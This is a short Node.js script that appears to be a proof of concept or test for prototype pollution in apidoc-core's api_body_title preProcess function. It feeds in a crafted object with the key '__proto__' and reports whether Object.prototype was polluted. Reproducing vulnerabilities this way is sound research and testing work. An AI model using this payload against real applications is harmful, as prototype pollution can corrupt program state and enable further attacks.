let parsedFiles = [
    [
        {
            global: {
                'define': {
                    name: "__proto__",
                },
            },
            version: "polluted",
        }
    ]
]
require("apidoc-core/lib/workers/api_body_title").preProcess(parsedFiles,[], {})
console.log({}.polluted !== undefined ? '[POLLUTION_TRIGGERED]' : '');